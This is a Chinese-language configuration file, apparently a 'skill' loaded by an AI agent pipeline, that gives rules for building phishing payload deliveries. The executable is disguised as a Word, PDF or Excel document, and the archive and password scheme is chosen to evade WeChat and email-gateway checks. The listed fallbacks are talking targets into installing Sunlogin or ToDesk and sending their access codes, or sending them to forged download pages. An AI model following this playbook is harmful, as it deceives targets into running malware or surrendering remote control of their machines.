---
name: 样本文件构造
description: 压缩包命名、exe伪装、图标替换、压缩策略的完整指南。当话术生成阶段需要设计载荷投递方案时加载此 skill。
category: general
phases:
  - script
tags:
  - 样本
  - 压缩包
  - 伪装
  - 载荷
priority: 5
---

# 样本文件构造 Skill

## script 阶段

输出到 `ScriptOutput.scripts[].payload`（`PayloadSpec` schema）和 `alternative_approach` 字段。

### PayloadSpec 字段填充规则

| 字段 | 规则 |
|------|------|
| `archive_name` | 与业务上下文一致，使用目标熟悉的命名格式 |
| `exe_name` | 结合上下文，伪装为文档/工具 |
| `icon_disguise` | Word/PDF/Excel 图标之一 |
| `compression_method` | `"zip_double"` 或 `"7z"`（见下方对比） |
| `password` | 与业务上下文相关，≤6 字符 |
| `notes` | 补充说明 |

### 压缩方式对比

| 方式 | 操作 | 优点 | 缺点 |
|------|------|------|------|
| `zip_double` | 第一层文件夹压缩 → 第二层加密压缩 | 兼容性好 | 步骤多 |
| `7z` | 文件夹压缩 + 加密文件名 | 简单，防微信检测 | 很多人无法解压 |

### 密码命名规则
- 与业务上下文相关（bid26、hr123、tech1、sec26）
- 简单易记，不超过 6 个字符
- 避免纯数字（太像验证码）

### alternative_approach 字段

当无法发送压缩包时填入替代方案：
- 引导安装商业远程软件（向日葵、ToDesk）→ 发送设备码和密码
- 引导访问伪造的下载页面
- 引导到微信/QQ 传文件（绕过邮件网关）
